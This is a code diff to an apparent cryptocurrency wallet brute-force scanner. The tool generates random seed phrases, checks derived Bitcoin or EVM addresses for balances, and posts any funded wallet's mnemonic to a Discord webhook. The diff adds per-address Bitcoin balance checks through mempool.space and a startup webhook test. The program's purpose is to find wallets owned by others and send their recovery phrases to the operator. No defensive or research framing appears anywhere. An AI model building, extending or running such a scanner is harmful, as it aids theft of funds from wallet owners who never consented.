@@ -219,13 +219,38 @@ class AlertManager:
                 {"name": "🆔 Wallet ID", "value": str(wallet_id), "inline": True},
                 {"name": "🕐 Found At", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": True}
             ],
-            "footer": {"text": f"Scanner v4.5 (HEAD Request Support) | {BLOCKCHAIN.upper()}"},
+            "footer": {"text": f"Scanner v4.6 (Discord test on start) | {BLOCKCHAIN.upper()}"},
             "timestamp": datetime.utcnow().isoformat()
         }
         async with aiohttp.ClientSession() as session:
             async with session.post(DISCORD_WEBHOOK, json={"embeds": [embed]}, timeout=10) as resp:
                 if resp.status not in (200, 204):
                     raise Exception(f"Discord returned {resp.status}")
+
+    # ---------- NEW: Send a test alert (called once on startup) ----------
+    async def send_test_alert(self):
+        """Send a simple startup notification to Discord."""
+        embed = {
+            "title": f"🚀 Scanner Started ({BLOCKCHAIN.upper()})",
+            "color": 0x00aaff,
+            "fields": [
+                {"name": "🕐 Started At", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": True},
+                {"name": "⚙️ Configuration",
+                 "value": f"Workers: {MAX_WORKERS}\nBatch size: {BATCH_SIZE}\nMin balance: {ALERT_MIN_BALANCE}\nAddresses per wallet: {NUM_ADDRESSES}",
+                 "inline": False}
+            ],
+            "footer": {"text": "Test notification – scanner is online"},
+            "timestamp": datetime.utcnow().isoformat()
+        }
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post(DISCORD_WEBHOOK, json={"embeds": [embed]}, timeout=10) as resp:
+                    if resp.status in (200, 204):
+                        logger.info("✅ Discord webhook test succeeded")
+                    else:
+                        logger.warning(f"⚠️ Discord webhook test returned {resp.status} – check your webhook URL")
+        except Exception as e:
+            logger.warning(f"⚠️ Discord webhook test failed: {e} – continuing anyway")
 
 # ---------- Scanner ----------
 class WalletScanner:
@@ -392,10 +417,10 @@ class WalletScanner:
             pass
         return 0.0
 
-    # ---------- OPTIMIZED SCAN LOOP ----------
+    # ---------- OPTIMIZED SCAN LOOP (supports both EVM and Bitcoin) ----------
     async def scan_loop(self):
         errors = 0
-        pending = []
+        pending = []   # Only used for EVM
         while not self._shutdown:
             try:
                 mnemonic = self.generate_mnemonic()
@@ -428,6 +453,33 @@ class WalletScanner:
                         errors = 0
                     continue
 
+                # ---------- BITCOIN: process immediately (no batching) ----------
+                if BLOCKCHAIN == "bitcoin":
+                    for addr in addresses:
+                        bal = await self._btc_balance(addr)
+                        self.balance_cache.set(addr, bal, time.time())
+                        balances = {addr: bal}
+                        total = bal
+                        self.stats['checked'] += 1
+
+                        if total > ALERT_MIN_BALANCE:
+                            self.wallet_counter += 1
+                            wallet_id = self.wallet_counter
+                            self.stats['funded'] += 1
+                            logger.info(f"💎 FUNDED! ID:{wallet_id} | Total:{total:.8f} BTC")
+                            await self.alert_mgr.send_alert(mnemonic, balances, total, wallet_id)
+                            self.stats['alerts'] += 1
+
+                        if self.stats['checked'] % 10 == 0:
+                            rate = self.stats['funded'] / max(self.stats['checked'], 1) * 1e6
+                            elapsed = time.time() - self.stats['start_time']
+                            logger.info(f"📊 Checked:{self.stats['checked']} | Funded:{self.stats['funded']} | Rate:{rate:.2f}/M | {elapsed:.0f}s elapsed")
+
+                    # Small delay to avoid hammering mempool.space
+                    await asyncio.sleep(0.05)
+                    continue
+
+                # ---------- EVM: batch processing ----------
                 pending.append((mnemonic, addresses))
                 errors = 0
 
@@ -462,7 +514,7 @@ class WalletScanner:
                             elapsed = time.time() - self.stats['start_time']
                             logger.info(f"📊 Checked:{self.stats['checked']} | Funded:{self.stats['funded']} | Rate:{rate:.2f}/M | {elapsed:.0f}s elapsed")
 
-                    # ✅ OPTIMIZED: Polite throttling applied ONLY after a batch network request
+                    # Polite throttling after each batch
                     await asyncio.sleep(random.uniform(0.1, 0.3))
                     pending = []
 
@@ -495,11 +547,9 @@ class HealthHandler(BaseHTTPRequestHandler):
         self.wfile.write(b'OK')
         
     def do_HEAD(self):
-        # Respond to HEAD requests (commonly used by uptime monitors)
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        # Intentionally no body written for HEAD requests
         
     def log_message(self, format, *args):
         pass
@@ -525,7 +575,11 @@ async def main():
     else:
         logger.info("🔗 Using mempool.space for Bitcoin")
 
-    logger.info("🧪 Running startup test...")
+    # ---------- STARTUP TEST: Discord webhook ----------
+    logger.info("📢 Testing Discord webhook...")
+    await scanner.alert_mgr.send_test_alert()
+
+    logger.info("🧪 Running startup test (mnemonic generation & derivation)...")
     test_mnemonic = scanner.generate_mnemonic()
     if test_mnemonic:
         logger.info(f"✅ Mnemonic generated: {test_mnemonic[:20]}...")
